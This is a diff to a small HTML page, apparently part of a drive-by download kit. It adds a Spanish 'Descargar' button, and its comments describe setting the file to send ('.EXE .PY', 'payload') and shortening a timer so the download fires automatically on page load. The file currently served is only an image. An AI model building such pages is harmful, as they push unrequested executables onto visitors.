@@ -1,6 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- Add icon library -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+.btn {
+  background-color: DodgerBlue;
+  border: none;
+  color: white;
+  padding: 12px 30px;
+  cursor: pointer;
+  font-size: 20px;
+}
+
+
+.btn:hover {
+  background-color: RoyalBlue;
+}
+
+
+</style>	
 <title></title>
 <script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
 <script>
@@ -9,16 +29,20 @@ $('a[data-auto-download]').each(function(){
 var $this = $(this);
 setTimeout(function() {
 window.location = $this.attr('href');
-}, 200);
+}, 999999999999999999999); <!-- change to 200 for self-discharge(data-auto-download) -->
 });
 });
 </script>
 </head>
 <body>
 <div class="wrapper">
-<!-- DEFINE FILE TO SEND  .EXE .PY ..ETC -->
+<!-- DEFINE FILE TO SEND  DATA-AUTO-DOWNLOAD href="payload"; ONECLICK="payload" -->
 <a data-auto-download href="Image/Fnew.png" ></a>
+<center>
+<input type="submit" class="btn" style="width:20%" class="fa fa-download" class="BotonDown" value="Descargar" onclick="document.location.href='Image/Fnew.png'">
+</center>
 </a>
 </div>
 </body>
 </html>
+
